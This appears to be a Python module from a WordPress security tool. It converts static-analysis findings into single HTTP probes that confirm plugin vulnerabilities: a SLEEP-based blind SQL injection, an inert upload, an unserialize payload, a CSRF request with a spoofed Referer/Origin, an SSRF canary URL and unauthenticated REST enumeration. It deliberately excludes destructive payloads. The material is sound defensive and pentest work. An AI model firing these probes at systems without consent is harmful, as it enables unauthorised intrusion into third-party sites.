"""AST finding -> minimal working HTTP probe.

Given a finding from one of Argos's AST scanners (sql_injection,
file_upload, poi, csrf, ssrf, rest_authz) against a specific plugin
version, produce ONE HTTP request that confirms or denies the vuln.

The probe is:
  - Minimal       one crafted request, no fuzzing.
  - Targeted      uses the exact parameter names + actions the scanner
                  saw in source.
  - Predicted     we know what a vulnerable response looks like AND
                  what a non-vulnerable response looks like.

Design philosophy
-----------------
A commodity scanner (nuclei/wpscan) sends dozens of payload variants
because it does not know the target's source. An APT knows. It reads
the source, picks the exact payload, sends it once, watches the
response.

This module turns AST findings into that single crafted request.

Rules of engagement
-------------------
Every payload here is a minimal PoC that confirms the bug class.
We deliberately do NOT include payloads that ESCALATE to damage
(no DROP TABLE, no arbitrary-file-write to production paths, no
reverse shells). A Stage-2 consented engagement's escalation steps
are a human operator decision, not an automated tool's call.
"""

from __future__ import annotations

import hashlib
import json
import re
import secrets
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple


# ---- The probe object --------------------------------------------


@dataclass
class PayloadProbe:
    """A single synthesized HTTP probe derived from an AST finding.

    Every probe carries:
      - the HTTP method + URL + headers + body
      - a signature of the VULNERABLE response (what proves the bug)
      - a signature of the NON-VULNERABLE response (what proves safety)
      - the minimum evidence we want to collect
      - a risk rating so the operator can approve before firing
    """
    # The request
    method:      str = "GET"
    url:         str = ""
    headers:     Dict[str, str] = field(default_factory=dict)
    body:        Optional[str] = None
    # Interpretation
    vuln_signal: str = ""     # what in the response proves it
    safe_signal: str = ""     # what proves it's NOT vulnerable
    evidence_regex: Optional[str] = None  # extract this from response
    # Provenance
    source_rule_id: str = ""
    plugin_slug:   str = ""
    plugin_version: str = ""
    finding_id:    str = ""
    cwe:           str = ""
    # Risk classification
    risk_tier:    str = "low"    # low | medium | high — for operator gate
    rationale:    str = ""
    # Observability
    expected_aegis_events: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict:
        return {
            "method":                self.method,
            "url":                   self.url,
            "headers":               self.headers,
            "body":                  self.body,
            "vuln_signal":           self.vuln_signal,
            "safe_signal":           self.safe_signal,
            "evidence_regex":        self.evidence_regex,
            "source_rule_id":        self.source_rule_id,
            "plugin_slug":           self.plugin_slug,
            "plugin_version":        self.plugin_version,
            "finding_id":            self.finding_id,
            "cwe":                   self.cwe,
            "risk_tier":             self.risk_tier,
            "rationale":             self.rationale,
            "expected_aegis_events": self.expected_aegis_events,
        }


# ---- Synthesis dispatch ------------------------------------------


def _hash_finding_id(finding: dict) -> str:
    key = f"{finding.get('scanner')}|{finding.get('rule_id')}|" \
          f"{finding.get('plugin_slug')}|{finding.get('file_path')}|" \
          f"{finding.get('line')}"
    return hashlib.sha256(key.encode()).hexdigest()[:12]


def synthesize_probe(finding: dict, target_url: str) -> Optional[PayloadProbe]:
    """Route a finding to the appropriate synthesis strategy.

    finding is an ASTFinding-as-dict. target_url is the base URL
    (including scheme+host, no trailing slash).

    Returns None when we don't know how to synthesize a probe for
    this rule (APT discipline: don't fire a blind probe).
    """
    base = target_url.rstrip("/")
    scanner = (finding.get("scanner") or "").lower()
    rule = finding.get("rule_id") or ""
    fid = _hash_finding_id(finding)

    dispatchers = {
        "sql_injection":  _synth_sqli,
        "file_upload":    _synth_upload,
        "poi":            _synth_poi,
        "csrf":           _synth_csrf,
        "ssrf":           _synth_ssrf,
        "rest_authz":     _synth_rest_authz,
    }
    fn = dispatchers.get(scanner)
    if not fn:
        return None
    probe = fn(finding, base)
    if probe is None:
        return None
    probe.finding_id    = fid
    probe.plugin_slug   = finding.get("plugin_slug") or ""
    probe.plugin_version = finding.get("plugin_version") or ""
    probe.source_rule_id = rule
    probe.cwe           = finding.get("cwe") or ""
    return probe


# ---- Per-class synthesis ------------------------------------------


def _plugin_endpoint_hint(finding: dict) -> str:
    """Best-effort endpoint extraction from an AST finding's file_path.

    Plugin admin-ajax / REST endpoints don't live at a predictable URL;
    they're registered via add_action('wp_ajax_X', ...) or
    register_rest_route('ns/v1', '/path', ...). The AST finding has the
    PHP file_path + line; the actual URL depends on the hook name which
    we'd need to cross-reference. For precision-mode v1 we route
    probes through the best-guess path and document that as a known
    approximation.
    """
    fp = (finding.get("file_path") or "").lower()
    slug = (finding.get("plugin_slug") or "").lower()
    # Admin-ajax hook is the most common WP-plugin entry point.
    # If the plugin registers wp_ajax_<slug>_<action>, the URL is
    # /wp-admin/admin-ajax.php?action=<slug>_<action> — but we can't
    # infer the action from file_path alone. Leave as admin-ajax
    # with a probe_action marker the operator can edit.
    if "rest" in fp or "endpoint" in fp:
        # REST: plugin exposes /wp-json/<slug>/<version>/<route>
        # We don't know the route name from file_path; probe the
        # namespace index and let the chain_reasoner pick.
        return "rest"
    return "admin-ajax"


def _synth_sqli(finding: dict, base: str) -> Optional[PayloadProbe]:
    """SQLi probe: time-based blind confirmation.

    The safest confirmation is a time-based blind probe: send a
    payload that induces a measurable delay IFF the query executes.
    Classic: `SLEEP(5)` — if the server takes ~5s longer than
    baseline, the injection is real.

    We use a short delay (4s) to stay under most WAF-timeout thresholds
    and to keep the probe gentle.
    """
    rule = finding.get("rule_id", "")
    if rule not in (
        "sql.interpolation_in_query",
        "sql.prepare_with_interpolation",
        "sql.direct_request_query",
        "sql.raw_mysqli_query",
    ):
        return None

    hint = _plugin_endpoint_hint(finding)
    if hint == "admin-ajax":
        url = f"{base}/wp-admin/admin-ajax.php"
        # Guess a plausible action name — ONLY if the operator edits
        # before firing. Default action="probe" is INTENTIONALLY not
        # going to match anything; the operator is forced to set it.
        params = {"action": "PLACEHOLDER_ACTION",
                  "id": "1' AND SLEEP(4)-- -"}
        url_with = url + "?" + urllib.parse.urlencode(params)
    else:
        url_with = f"{base}/wp-json/{finding.get('plugin_slug')}/v1/query?id=1'%20AND%20SLEEP(4)--%20-"

    return PayloadProbe(
        method="GET",
        url=url_with,
        headers={
            "Accept": "application/json, text/html;q=0.9",
        },
        vuln_signal=(
            "response latency greater than 3.5 s AND less than 15 s "
            "(SLEEP(4) executed in the DB context)"
        ),
        safe_signal=(
            "response latency within 2 s of baseline GET /wp-json/ (no "
            "query delay means the payload didn't reach the DB)"
        ),
        evidence_regex=None,
        risk_tier="low",   # time-based blind; no data exfil in the probe
        rationale=(
            "Time-based blind SQLi confirms the injection point without "
            "extracting any data. Minimal evidence, maximum deniability."
        ),
        expected_aegis_events=[
            "aegis.db.suspicious_query",  # our SQLi runtime sensor should
                                          # catch 'SLEEP(' in the query
            "aegis.block.started",         # if our Aegis sqli_attempt rule
                                          # fires (threshold 2/60s)
        ],
    )


def _synth_upload(finding: dict, base: str) -> Optional[PayloadProbe]:
    """Upload vuln probe: inert-tag detection.

    We do NOT upload a PHP shell. We upload a file with a distinctive
    HTML comment in the body + a legitimate-looking image extension.
    If the file later appears at a predictable path, the upload is
    confirmed. The operator then decides whether to escalate.
    """
    rule = finding.get("rule_id", "")
    if rule not in (
        "upload.move_uploaded_file_tainted_dest",
        "upload.move_uploaded_file_no_ext_check",
        "upload.wp_handle_upload_test_form_off",
        "upload.upload_mimes_adds_php",
    ):
        return None

    tag = "AMSW-PROBE-" + secrets.token_hex(4).upper()
    payload = f"GIF87a\n<!-- {tag} -->\n"
    # Multipart encode as a tiny "image".
    boundary = "---amsw-" + secrets.token_hex(6)
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="probe.gif"\r\n'
        f"Content-Type: image/gif\r\n\r\n"
        f"{payload}\r\n"
        f"--{boundary}--\r\n"
    )
    # Upload endpoint varies per plugin — the operator must set it.
    url = f"{base}/wp-admin/admin-ajax.php?action=PLACEHOLDER_UPLOAD_ACTION"

    return PayloadProbe(
        method="POST",
        url=url,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        },
        body=body,
        vuln_signal=(
            f"response returns a URL containing the tag '{tag}' OR "
            f"a GET to /wp-content/uploads/probe.gif returns 200 with "
            f"the tag string in the body"
        ),
        safe_signal=(
            "response is 403 OR 400 OR 422 indicating the upload was "
            "rejected by MIME/extension validation"
        ),
        evidence_regex=tag,
        risk_tier="medium",
        rationale=(
            "Minimal inert-content upload (GIF87a header with HTML "
            "comment tag). The tag is unique per probe so we can "
            "trace where the file landed. NO executable code, NO "
            "PHP open tags, NO .phtml extension. If the site accepts "
            "this AND serves it back, we've confirmed the vuln."
        ),
        expected_aegis_events=[
            "aegis.media.dangerous_upload",
            "aegis.scanner.shape_detected",
        ],
    )


def _synth_poi(finding: dict, base: str) -> Optional[PayloadProbe]:
    """POI probe: inert serialized-object detection.

    Fire a serialized-object payload that exercises the unserialize
    path but does NOT instantiate anything harmful. The object is a
    stdClass with a unique property value — if we see the property
    in the response, the sink unserialized our payload.
    """
    rule = finding.get("rule_id", "")
    if rule not in (
        "poi.unserialize_on_request",
        "poi.maybe_unserialize_on_request",
        "poi.unserialize_on_option",
        "poi.unserialize_on_meta",
    ):
        return None

    tag = "AMSW_POI_" + secrets.token_hex(4).upper()
    # stdClass with one property — no magic method invocation, no
    # file ops, no SSRF.
    payload = f'O:8:"stdClass":1:{{s:5:"probe";s:{len(tag)}:"{tag}";}}'
    # Most plugin POI vectors are POST params.
    url = f"{base}/wp-admin/admin-ajax.php"
    body = urllib.parse.urlencode({
        "action": "PLACEHOLDER_POI_ACTION",
        "data":   payload,
    })

    return PayloadProbe(
        method="POST",
        url=url,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body=body,
        vuln_signal=(
            f"response contains the tag '{tag}' (payload was deserialized "
            f"and reflected) OR HTTP 500 with an unserialize-related "
            f"stack trace"
        ),
        safe_signal=(
            "response is 400/403/404 (sink rejected the payload) OR "
            "response body does not contain the tag"
        ),
        evidence_regex=tag,
        risk_tier="medium",
        rationale=(
            "Inert stdClass deserialization probe. No magic methods, "
            "no gadget chain, no class loading from untrusted sources. "
            "Purely confirms the unserialize() sink fires on our input."
        ),
        expected_aegis_events=[
            "aegis.request.poi_payload",   # our v0.7 sensor
            "aegis.block.started",          # poi_attempt threshold=1
        ],
    )


def _synth_csrf(finding: dict, base: str) -> Optional[PayloadProbe]:
    """CSRF probe: cross-origin form submission without nonce.

    Send a POST to the admin-post or wp-ajax handler with a cross-
    origin Referer, no nonce, and a distinctive marker. If the
    handler accepts the request and makes the state change, CSRF
    is confirmed. The probe SHOULD fail with a proper defense.
    """
    rule = finding.get("rule_id", "")
    if rule not in (
        "csrf.admin_post_no_nonce",
        "csrf.admin_post_nopriv_state_change",
        "csrf.wp_ajax_no_nonce",
        "csrf.wp_ajax_nopriv_state_change",
    ):
        return None

    tag = "AMSW_CSRF_" + secrets.token_hex(4).upper()
    if "admin_post" in rule:
        url = f"{base}/wp-admin/admin-post.php"
    else:
        url = f"{base}/wp-admin/admin-ajax.php"
    body = urllib.parse.urlencode({
        "action":   "PLACEHOLDER_STATE_CHANGE_ACTION",
        "marker":   tag,
    })

    return PayloadProbe(
        method="POST",
        url=url,
        headers={
            # The evasion here is REFERER: a real CSRF comes from a
            # different origin. We use a plausible third-party site.
            "Referer": "https://www.google.com/search",
            "Origin":  "https://www.google.com",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body=body,
        vuln_signal=(
            "response is 200 or 302 (accepted) AND the intended side-"
            "effect happened (the operator verifies out-of-band — "
            "option set, post created, user added). The 'marker' tag "
            f"'{tag}' is searchable in the subsequent state."
        ),
        safe_signal=(
            "response is 403 Forbidden (nonce rejected) OR redirect "
            "to wp-login.php OR explicit 'check_admin_referer failed' "
            "error"
        ),
        evidence_regex=None,
        risk_tier="medium",
        rationale=(
            "A real CSRF probe must have a plausible cross-origin "
            "Referer to simulate the attack correctly. The marker tag "
            "lets the operator verify out-of-band whether the state "
            "change occurred without re-probing."
        ),
        expected_aegis_events=[
            "aegis.csrf.suspicious_request",  # v0.8 sensor
        ],
    )


def _synth_ssrf(finding: dict, base: str) -> Optional[PayloadProbe]:
    """SSRF probe: canary URL detection via our own DNS.

    We use a unique subdomain under a canary domain we control
    (or a public canary service like interact.sh). If the target's
    outbound request hits our canary, SSRF is confirmed — no need
    to read AWS metadata or anything sensitive.
    """
    rule = finding.get("rule_id", "")
    if rule not in (
        "ssrf.wp_remote_request_tainted",
        "ssrf.file_get_contents_remote_tainted",
        "ssrf.curl_exec_tainted_url",
    ):
        return None

    tag = secrets.token_hex(6)
    canary_host = "canary.amoskys-lab.test"  # operator configures this
    canary_url = f"http://{tag}.{canary_host}/ssrf-probe"

    url = f"{base}/wp-admin/admin-ajax.php?action=PLACEHOLDER_URL_FETCH" \
          f"&url={urllib.parse.quote(canary_url)}"

    return PayloadProbe(
        method="GET",
        url=url,
        headers={"Accept": "application/json"},
        vuln_signal=(
            f"our canary ({tag}.{canary_host}) receives an HTTP request "
            f"OR a DNS query from the target server within 60 seconds "
            f"of this probe"
        ),
        safe_signal=(
            "no canary hit within 60 seconds — the target fetched "
            "nothing external for us"
        ),
        evidence_regex=tag,
        risk_tier="low",
        rationale=(
            "Out-of-band SSRF confirmation via canary. The probe itself "
            "is a single GET with a URL parameter pointing to our "
            "canary; the CONFIRMATION signal arrives at our canary "
            "server, not in the probe's response. This is the gold "
            "standard for SSRF detection (zero impact on the target "
            "beyond one outbound request)."
        ),
        expected_aegis_events=[
            "aegis.outbound.ssrf_attempt",  # v0.9 sensor
        ],
    )


def _synth_rest_authz(finding: dict, base: str) -> Optional[PayloadProbe]:
    """REST authz probe: unauth access to a state-changing route."""
    rule = finding.get("rule_id", "")
    if rule not in (
        "rest_authz.permission_callback_missing",
        "rest_authz.permission_callback_return_true",
        "rest_authz.wp_ajax_nopriv_state_change",
    ):
        return None

    # Without knowing the exact route, we probe the /wp-json/ index
    # to see if the plugin's namespace is listed unauth — a weaker
    # but safe first step. The operator can then target the specific
    # route once identified.
    slug = finding.get("plugin_slug") or ""
    url = f"{base}/wp-json/{slug}/v1/"

    return PayloadProbe(
        method="GET",
        url=url,
        headers={"Accept": "application/json"},
        vuln_signal=(
            f"response is 200 AND JSON includes a 'routes' key listing "
            f"endpoints — the plugin's namespace is accessible unauth."
        ),
        safe_signal=(
            "response is 401/403 — the index is gated"
        ),
        evidence_regex=r'"routes"\s*:\s*\{',
        risk_tier="low",
        rationale=(
            "Step 1 of REST-authz exploitation: enumerate the plugin's "
            "namespace. Only after we see which routes are exposed do "
            "we send follow-up probes against specific endpoints."
        ),
        expected_aegis_events=[
            "aegis.rest.response",
            "aegis.rest.unauth_routes_detected",
        ],
    )
